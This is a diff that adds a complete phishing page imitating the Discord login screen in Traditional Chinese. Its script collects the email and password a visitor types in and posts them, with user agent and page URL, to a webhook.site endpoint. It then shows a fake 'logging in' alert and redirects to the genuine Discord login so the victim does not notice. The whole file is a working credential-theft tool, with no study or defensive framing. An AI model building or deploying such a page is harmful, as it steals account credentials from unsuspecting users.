@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord - 登入</title>
+  <style>
+    body { margin:0; font-family:'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background:#36393f; color:#dcddde; height:100vh; display:flex; align-items:center; justify-content:center; }
+    .container { width:440px; background:#36393f; padding:40px; border-radius:5px; box-shadow:0 2px 10px rgba(0,0,0,0.4); }
+    .logo { text-align:center; margin-bottom:30px; }
+    .logo img { width:80px; height:auto; }
+    h1 { font-size:24px; text-align:center; color:#fff; margin:0 0 8px; }
+    .sub { text-align:center; color:#b9bbbe; margin-bottom:30px; font-size:16px; }
+    label { display:block; margin-bottom:8px; color:#b9bbbe; font-size:14px; font-weight:600; }
+    input { width:100%; padding:10px; margin-bottom:20px; background:#202225; border:1px solid #202225; border-radius:3px; color:#fff; font-size:16px; box-sizing:border-box; }
+    input:focus { outline:none; border-color:#5865f2; box-shadow:0 0 0 2px rgba(88,101,242,0.3); }
+    button { width:100%; padding:12px; background:#5865f2; color:#fff; border:none; border-radius:3px; font-size:16px; font-weight:500; cursor:pointer; transition:background 0.2s; }
+    button:hover { background:#4752c4; }
+    .footer { text-align:center; margin-top:20px; font-size:12px; color:#72767d; }
+    .footer a { color:#00aff4; text-decoration:none; }
+    .footer a:hover { text-decoration:underline; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/6257d3a0e8b7d6b0c0e6f6d2_discord-logo-wordmark-color-white.svg" alt="Discord">
+    </div>
+    <h1>歡迎回來！</h1>
+    <div class="sub">很高興再次見到你</div>
+    
+    <form id="login-form">
+      <label>電子郵件或電話號碼</label>
+      <input type="text" id="email" autocomplete="off" required>
+      
+      <label>密碼</label>
+      <input type="password" id="password" autocomplete="off" required>
+      
+      <button type="submit">登入</button>
+    </form>
+    
+    <div class="footer">
+      <a href="#">忘記密碼？</a><br>
+      <span>需要帳號？ <a href="#">註冊</a></span>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      // 傳送到你的 webhook
+      fetch('https://webhook.site/7a08f4e8-a861-4eb9-9104-5412abf52d94', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ email, password, timestamp: Date.now(), ua: navigator.userAgent, url: location.href })
+      });
+      
+      // 假登入效果 + 跳轉
+      alert('登入中...');
+      setTimeout(() => { location.href = 'https://discord.com/login'; }, 1000);
+    });
+  </script>
+</body>
+</html>
